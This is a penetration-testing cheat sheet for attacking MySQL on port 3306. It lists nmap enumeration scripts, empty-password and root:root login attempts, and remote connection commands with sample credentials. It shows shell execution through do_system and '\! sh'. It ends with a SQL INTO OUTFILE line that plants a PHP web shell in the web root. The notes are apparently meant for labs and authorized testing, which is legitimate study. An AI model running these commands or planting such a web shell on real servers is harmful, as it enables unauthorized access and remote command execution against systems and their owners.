# MySQL \[3306]

### Nmap

```
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <ip> -p 3306 ​ 
nmap -sV -Pn -vv --script=mysql* <ip> -p 3306 
```

### Local Access

if you gain access to target box and see mysql running , you can try to connect with it from target locally

```
mysql -u root 
# Connect to root without password

mysql -u root -p 
# A password will be asked
# Always test root:root credential

```

### Remote Access

```
mysql -h <Hostname> -u root

mysql -h <Hostname> -u root@localhost

mysql -u julio -pPassword123 -h 10.129.20.13
# MySQL - Connecting to the SQL Server

sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
# sqsh is alternative for myslq but in Linux

mssqlclient.py -p 1433 julio@10.129.203.7
# Impacket script for linux
```

> Specify the domain name or the hostname to use Windows Authentication. For local account use `SERVERNAME\\accountname` or `.\\accountname`&#x20;

### If running as root <a href="#if-running-as-root" id="if-running-as-root"></a>

If Mysql is running as root and you have acces, you can run commands:

```
mysql> select do_system('id');

mysql> \! sh
```

### Exploring database

<table><thead><tr><th width="267">Commands</th><th>Description</th></tr></thead><tbody><tr><td><code>show databases;</code></td><td>List all the databases.</td></tr><tr><td><code>use &#x3C;database>;</code></td><td>select the database from available databases.</td></tr><tr><td><code>show tables;</code></td><td>List all the tables.</td></tr><tr><td><code>describe &#x3C;table>;</code></td><td>To see what the structure of a table</td></tr><tr><td><code>SELECT &#x3C;column1>, &#x3C;column2> FROM &#x3C;table>;</code></td><td>print out all the vlaues from the table and columns specified.</td></tr><tr><td>SELECT * FROM &#x3C;table> WHERE &#x3C;column> = "&#x3C;str>";</td><td>list contents where search item is located.</td></tr></tbody></table>

[CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass)

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

## Command execution

`MySQL` doesn't have `xp_cmdshell` but we can write a code and find a way to execute it instead (ASP.NET, PHP)

**MySQL - Write Local File**

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
